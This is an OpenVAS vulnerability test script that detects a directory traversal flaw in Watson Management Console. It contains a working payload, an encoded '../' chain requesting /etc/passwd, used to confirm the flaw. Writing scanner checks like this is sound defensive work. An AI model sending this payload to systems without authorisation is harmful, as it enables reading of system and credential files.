###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_watson_management_console_lfi.nasl 9984 2018-05-28 14:36:22Z cfischer $
#
# Watson Management Console Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103641");
 script_bugtraq_id(57237);
 script_version ("$Revision: 9984 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Watson Management Console Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57237");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/23995/");

 script_tag(name:"last_modification", value:"$Date: 2018-05-28 16:36:22 +0200 (Mon, 28 May 2018) $");
 script_tag(name:"creation_date", value:"2013-01-10 13:28:43 +0100 (Thu, 10 Jan 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : "It has been found that Watson Management Console is prone to a
directory traversal vulnerability. The issue is due to the server's
failure to properly validate user supplied http requests.

This issue may allow an attacker to escape the web server root
directory and view any web server readable files. Information acquired
by exploiting this issue may be used to aid further attacks against a
vulnerable system.");

 script_tag(name:"solution_type", value:"NoneAvailable");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

url = '/index.cgi';

if(http_vuln_check(port:port, url:url, pattern:"<TITLE>Watson Management Console", usecache:TRUE )) {

  url = '/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd';

  if(http_vuln_check(port:port, url:url,pattern:"root:x:0:0:root:")) {
    security_message(port:port);
    exit(0);
  }

}

exit(0);
